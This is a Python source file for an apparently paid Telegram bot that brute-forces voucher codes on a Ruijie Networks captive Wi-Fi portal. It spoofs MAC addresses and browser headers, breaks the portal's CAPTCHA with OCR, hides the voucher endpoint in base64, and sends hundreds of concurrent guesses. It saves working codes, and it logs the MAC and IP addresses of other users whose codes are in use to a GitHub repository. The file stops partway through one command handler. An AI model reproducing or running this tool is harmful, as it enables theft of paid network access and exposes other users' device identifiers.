import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse, parse_qs

# ==================== CONFIG ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
REPO_OWNER = os.environ.get('REPO_OWNER', '')
REPO_NAME = os.environ.get('REPO_NAME', '')
ADMIN_ID = os.environ.get('ADMIN_ID', '5376101564')
CONCURRENCY = int(os.environ.get('CONCURRENCY', '750'))
WEB_PORT = int(os.environ.get('PORT', '10000'))

# ==================== HEADER POOLS ====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,my;q=0.8",
    "en;q=0.9",
    "en-US,en;q=0.9,th;q=0.8",
    "en-US,en;q=0.8",
    "en-GB,en;q=0.9,my;q=0.7",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
]

SEC_CH_UA = [
    '"Chromium";v="148", "Google Chrome";v="148", "Not-A.Brand";v="99"',
    '"Chromium";v="147", "Google Chrome";v="147", "Not-A.Brand";v="99"',
    '"Chromium";v="148", "Microsoft Edge";v="148", "Not-A.Brand";v="99"',
    '"Chromium";v="139", "Not;A=Brand";v="99"',
]

SEC_CH_UA_PLATFORM = ['"Windows"', '"macOS"', '"Linux"', '"Android"']
SEC_CH_UA_MOBILE = ["?0", "?1"]

def random_headers(referer=None):
    """Return a dict of random browser-like headers."""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Sec-CH-UA": random.choice(SEC_CH_UA),
        "Sec-CH-UA-Platform": random.choice(SEC_CH_UA_PLATFORM),
        "Sec-CH-UA-Mobile": random.choice(SEC_CH_UA_MOBILE),
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    if referer:
        headers["Referer"] = referer
    return headers

# ==================== GLOBAL STATE ====================
SUCCESS_CODE = asyncio.Queue()
STA_INFO_QUEUE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}              
approve = {}                
scan_tasks = {}            
success_texts = {}          
limited_texts = {}          
success_messages = {}       
limited_messages = {}
notify_setting = {}         
last_scan_params = {}       
pending_brute = {}          
captcha_cache = {}          

session = None
_connector = None
_voucher_sem = None
_start_time = time.monotonic()

# ==================== WEB SERVER (Keep Alive) ====================
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', WEB_PORT)
    await site.start()

# ==================== GITHUB HELPERS ====================
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    headers.update(random_headers())  # Add random headers
    async with session.get(url, headers=headers) as resp:
        if resp.status == 200:
            data = await resp.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    headers.update(random_headers())  # Add random headers
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded, "sha": sha}
    async with session.put(url, headers=headers, json=payload) as resp:
        return await resp.text()

# ==================== UTILITY FUNCTIONS ====================
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(yyyy, MM, dd, hh, mm, 0, tzinfo=timezone.utc)
        return datetime.now(timezone.utc) < expiration_dt
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    total_seconds = 0
    parts = re.findall(r'(\d+)([dhm])', plan)
    if not parts:
        return None
    for val, unit in parts:
        val = int(val)
        if unit == 'd': total_seconds += val * 86400
        elif unit == 'h': total_seconds += val * 3600
        elif unit == 'm': total_seconds += val * 60
    if total_seconds == 0:
        return None
    return (now + timedelta(seconds=total_seconds)).isoformat()

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown': return 'Unknown'
    try:
        mins = int(total_minutes)
        hours = mins // 60
        minutes = mins % 60
        if hours > 0 and minutes > 0:
            return f"{hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{minutes}m"
    except:
        return str(total_minutes)

async def Code_Expires_Date(session_id):
    headers = random_headers(
        referer=f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={session_id}'
    )
    headers['x-requested-with'] = 'XMLHttpRequest'
    try:
        async with session.get(
            f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
            headers=headers, timeout=aiohttp.ClientTimeout(total=10)
        ) as req:
            resp = await req.json()
            profile = resp.get('result', {}).get('profileName', 'Unknown')
            totaltime = Minute_to_Hour(resp.get('result', {}).get('totalMinutes', 'Unknown'))
            return f"Plan: {profile} | Time: {totaltime}"
    except:
        return "Plan: Unknown | Time: Unknown"

# ==================== CAPTCHA ====================
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, mac)
    headers = random_headers(referer=url)
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            resp = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", resp)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    referer = f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}'
    headers = random_headers(referer=referer)
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    referer = f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}'
    headers = random_headers(referer=referer)
    headers['Content-Type'] = 'application/json'
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json={'sessionId': session_id, 'authCode': text}) as req:
        data = await req.json()
        return session_id if data.get("success") else None

def get_cached_captcha(chat_id):
    return captcha_cache.get(chat_id)

def cache_captcha(chat_id, session_id, auth_code):
    captcha_cache[chat_id] = {"session_id": session_id, "auth_code": auth_code}

def invalidate_captcha(chat_id):
    if chat_id in captcha_cache:
        del captcha_cache[chat_id]

# ==================== STA EXTRACTION ====================
def extract_mac_from_sta(response_text):
    try:
        data = json.loads(response_text)
        return data.get('clientMac') or data.get('staMac') or data.get('mac') or data.get('userMac')
    except:
        return None

def extract_ip_from_sta(response_text):
    try:
        data = json.loads(response_text)
        return data.get('clientIp') or data.get('staIp') or data.get('ip') or data.get('userIp')
    except:
        return None

# ==================== CODE GENERATORS ====================
LETTERS_NO_LO = "abcdefghijkmnpqrstuvwxyz"
LETTERS_DIGITS_NO_LO = LETTERS_NO_LO + "012345678"

def digit_generator_no9(length):
    return "".join(random.choice("012345678") for _ in range(length))

def ascii_generator_clean(length=6):
    return "".join(random.choice(LETTERS_NO_LO) for _ in range(length))

def all_generator_clean(length=6):
    return "".join(random.choice(LETTERS_DIGITS_NO_LO) for _ in range(length))

def is_all_same(code):
    return len(set(code)) == 1

def is_incrementing(code):
    digits = [int(c) for c in code]
    for i in range(len(digits)-1):
        if digits[i+1] != digits[i] + 1:
            return False
    return True

def is_decrementing(code):
    digits = [int(c) for c in code]
    for i in range(len(digits)-1):
        if digits[i+1] != digits[i] - 1:
            return False
    return True

def should_skip_digit_code(code):
    return is_all_same(code) or is_incrementing(code) or is_decrementing(code)

def iter_codes(mode, length=None):
    if mode in ["6", "7"]:
        length = int(mode)
        total = 9 ** length
        codes = []
        for i in range(total):
            code = ""
            temp = i
            for _ in range(length):
                code = str(temp % 9) + code
                temp //= 9
            code = code.zfill(length)
            if not should_skip_digit_code(code):
                codes.append(code)
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            code = digit_generator_no9(8)
            if not should_skip_digit_code(code):
                yield code
    if mode == "9":
        while True:
            code = digit_generator_no9(9)
            if not should_skip_digit_code(code):
                yield code
    if mode == "ascii-lower":
        length = length or 6
        while True:
            yield ascii_generator_clean(length)
    if mode == "all":
        length = length or 6
        while True:
            yield all_generator_clean(length)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:.1f} codes/sec",
    ]
    if total:
        pct = min(checked / total * 100, 100)
        filled = min(int(pct / 5), 20)
        bar = "█" * filled + "░" * (20 - filled)
        lines.append(f"🔍 Checked: {checked}/{total}")
        lines.append(f"[{bar}] {pct:.0f}%")
    else:
        lines.append(f"🔍 Checked: {checked}")
    lines.append(f"💎 Found: {found}")
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ==================== CORE VOUCHER CHECK ====================
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = None
            auth_code = None

            cached = get_cached_captcha(chat_id)
            if cached:
                session_id = cached["session_id"]
                auth_code = cached["auth_code"]
            else:
                session_id = await get_session_id(task_session, session_url)
                if not session_id: continue
                for _ in range(8):
                    try:
                        img = await Captcha_Image(task_session, session_id)
                        text = await Captcha_Text(img)
                        if not text: continue
                        if await Varify_Captcha(task_session, session_id, text):
                            auth_code = text
                            cache_captcha(chat_id, session_id, auth_code)
                            break
                    except:
                        continue
                if not auth_code:
                    continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = random_headers(
                referer=f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}"
            )
            headers["Content-Type"] = "application/json"
            headers["Origin"] = "https://portal-as.ruijienetworks.com"
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except:
                continue

            if 'checkCaptcha' in response or 'Invalid verification code' in response:
                invalidate_captcha(chat_id)
                continue

            if 'request limited' in response:
                continue
            break

    if 'response' not in locals():
        return

    if 'logonUrl' in response:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_info = await Code_Expires_Date(session_id)
        code_entry = f"{code} | {expire_info}"
        if not any(code_entry == x for x in success_texts[chat_id]):
            success_texts[chat_id].append(code_entry)
            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
            if notify_setting.get(chat_id, False) and message:
                code_lines = []
                for e in success_texts[chat_id]:
                    parts = e.split(" | ", 1)
                    if len(parts) == 2:
                        code_lines.append(f"<code>{parts[0]}</code> | {parts[1]}")
                    else:
                        code_lines.append(f"<code>{e}</code>")
                code_line = "\n".join(code_lines)
                text = f"✅ Success Codes:\n\n{code_line}"
                try:
                    if chat_id not in success_messages:
                        sent = await bot.send_message(chat_id, text, parse_mode="HTML")
                        success_messages[chat_id] = sent.message_id
                    else:
                        await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id],
                                                    text=text, parse_mode="HTML")
                except:
                    pass
        return code

    elif 'STA' in response:
        mac = extract_mac_from_sta(response)
        ip = extract_ip_from_sta(response)
        timestamp = datetime.now(timezone.utc).isoformat()
        await STA_INFO_QUEUE.put({
            "code": code,
            "mac": mac or "Unknown",
            "ip": ip or "Unknown",
            "timestamp": timestamp
        })

        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        mac_info = f" (MAC: {mac})" if mac else ""
        ip_info = f" (IP: {ip})" if ip else ""
        limited_texts[chat_id].append(f"{code}{mac_info}{ip_info}")
        if notify_setting.get(chat_id, False) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            text = f"⚠️ Limited Codes:\n<code>{limited_line}</code>"
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, text, parse_mode="HTML")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id],
                                                text=text, parse_mode="HTML")
            except:
                pass
    return None

# ==================== BRUTE-FORCE RUNNER ====================
async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, exhaustive_codes=None):
    if exhaustive_codes is not None:
        codes = exhaustive_codes
        total = len(codes)
        is_exhaustive = True
    else:
        try:
            code_iter = iter_codes(mode)
        except ValueError as e:
            await bot.send_message(chat_id, str(e))
            return
        total = 9 ** int(mode) if mode in ["6", "7"] else None
        is_exhaustive = mode in ["6", "7"]

    checked = 0
    found = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    code_index = 0

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return

            batch = []
            if is_exhaustive and exhaustive_codes is not None:
                while len(batch) < 1000 and code_index < total:
                    batch.append(codes[code_index])
                    code_index += 1
            else:
                for _ in range(1000):
                    try:
                        batch.append(next(code_iter))
                    except StopIteration:
                        break

            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                auth_list, _ = await get_file_content("auth_list.json")
                if str(chat_id) not in auth_list or not check_key_expiration(auth_list[str(chat_id)]):
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                    scan_tasks.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        try:
                            await progress_msg.edit_text("🎯 Target reached!")
                        except:
                            pass
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except:
                pass

        finish_text = "✅ Scan completed."
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
        except:
            await bot.send_message(chat_id, finish_text)
        scan_tasks.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        invalidate_captcha(chat_id)

# ==================== SCHEDULERS ====================
async def success_github_updater():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    cid = str(item["chat_id"])
                    if cid not in results:
                        results[cid] = []
                    if item["code"] not in results[cid]:
                        results[cid].append(item["code"])
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Success Update Error: {e}")

async def sta_github_updater():
    while True:
        await asyncio.sleep(80)
        items = []
        while not STA_INFO_QUEUE.empty():
            items.append(await STA_INFO_QUEUE.get())
        if items:
            try:
                sta_data, sha = await get_file_content("sta_info.json")
                for item in items:
                    code = item["code"]
                    sta_data[code] = {
                        "mac": item["mac"],
                        "ip": item["ip"],
                        "timestamp": item["timestamp"]
                    }
                await update_file_content("sta_info.json", sta_data, sha, "Periodic STA Update")
            except Exception as e:
                print(f"STA Update Error: {e}")

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် လမ်းညွှန်ကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "/key - Key အတည်ပြုရန်\n"
        "/setup [session_url] - Session URL ထည့်ရန်\n"
        "/brute <mode> [target/length] - Scan စတင်ရန်\n"
        "   modes: 6,7,8,9,ascii-lower,all\n"
        "   ဥပမာ: /brute 6 10  (၆လုံး code ၁၀ခုတွေ့သည်အထိ)\n"
        "   /brute all 7 (၇လုံးပါ code များရှာ)\n"
        "/stop - Scan ရပ်ရန်\n"
        "/resume - ရပ်ထားသော scan ပြန်စရန်\n"
        "/saved - ရလာသော success/limited codes ကြည့်ရန်\n"
        "/notify - code တွေ့တိုင်း message ပို့ On/Off\n"
        "/recheck - Success codes ပြန်စစ်ရန်\n"
        "/result - GitHub မှ သိမ်းထားသော codes များ ကြည့်ရန်\n\n"
        "**Admin Commands**\n"
        "/genkey <duration> <user_id> - Key ထုတ်ရန်\n"
        "/delkey <user_id> - Key ဖျက်ရန်\n"
        "/listkeys - Key စာရင်းကြည့်ရန်\n"
        "/status - Bot အခြေအနေကြည့်ရန်\n"
        "/stalist [code] - STA info list (admin)\n"
        "/delsta <code> - STA info တစ်ခုဖျက်ရန်"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key in auth_list:
        if check_key_expiration(auth_list[key]):
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို register မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း: /setup your_session_url")
        return
    url = args[1]
    if not approve.get(message.chat.id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if all(k in params for k in ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']):
        user_data[message.chat.id] = user_data.get(message.chat.id, {})
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း: /brute <mode> [target or length]\nဥပမာ /brute 6 10")
        return
    mode = args[1]
    target = None
    length = None
    if len(args) >= 3:
        try:
            if mode in ["ascii-lower", "all"]:
                length = int(args[2])
                if len(args) >= 4:
                    target = int(args[3])
            else:
                target = int(args[2])
        except:
            await bot.reply_to(message, "Target/Length သည် ဂဏန်းဖြစ်ရပါမည်။")
            return

    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "target": target, "length": length}
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {last_scan_params[chat_id]['mode']}, target: {last_scan_params[chat_id]['target']}).\nပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, target, length, message)

async def start_brute_scan(chat_id, mode, target, length, original_message):
    progress_msg = await bot.send_message(chat_id, "🔄 Preparing...")
    exhaustive_codes = None

    if mode in ["6", "7"]:
        total = 9 ** int(mode)
        progress_queue = asyncio.Queue()
        loop = asyncio.get_running_loop()

        async def update_progress():
            while True:
                pct, done = await progress_queue.get()
                bar_len = 20
                filled = int(pct / 5)
                bar = "█" * filled + "░" * (bar_len - filled)
                text = f"🔄 Preparing Scan for Mode {mode}...\n\n📦 Generating codes: [{bar}] {pct:.0f}%"
                try:
                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
                except:
                    pass
                if done:
                    break

        def generate_codes():
            codes = []
            step = max(1000, total // 100)
            next_update = step
            for i in range(total):
                temp = i
                code = ""
                for _ in range(int(mode)):
                    code = str(temp % 9) + code
                    temp //= 9
                code = code.zfill(int(mode))
                if not should_skip_digit_code(code):
                    codes.append(code)
                if i + 1 >= next_update or i == total - 1:
                    pct = (i + 1) / total * 100
                    asyncio.run_coroutine_threadsafe(progress_queue.put((pct, False)), loop)
                    next_update += step
            random.shuffle(codes)
            asyncio.run_coroutine_threadsafe(progress_queue.put((100, True)), loop)
            return codes

        prog_task = asyncio.create_task(update_progress())
        exhaustive_codes = await asyncio.to_thread(generate_codes)
        await prog_task
        await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id,
                                    text=f"✅ Preparation Complete! ({len(exhaustive_codes)} codes ready)")
    else:
        await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id,
                                    text="✅ Ready! Starting scan...")

    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id,
                       target=target, message=original_message, progress_msg=progress_msg,
                       exhaustive_codes=exhaustive_codes)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        invalidate_captcha(chat_id)
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ပြန်စနိုင်ပါသည်။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params.get('target'), params.get('length'), message)
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params.get('target'), params.get('length'), call.message)
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params.get('target'), params.get('length'), call.message)
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    msg = ""
    if success:
        code_lines = []
        for e in success:
            parts = e.split(" | ", 1)
            if len(parts) == 2:
                code_lines.append(f"<code>{parts[0]}</code> | {parts[1]}")
            else:
                code_lines.append(f"<code>{e}</code>")
        msg += f"✅ Success Codes ({len(success)}):\n" + "\n".join(code_lines) + "\n"
    if limited:
        msg += f"\n⚠️ Limited Codes ({len(limited)}):\n<code>" + "\n".join(limited) + "</code>"
    await bot.reply_to(message, msg, parse_mode="HTML")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, False)
    notify_setting[chat_id] = not current
    state = "ON" if notify_setting[chat_id] else "OFF"
    await bot.reply_to(message, f"Notify: {state}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
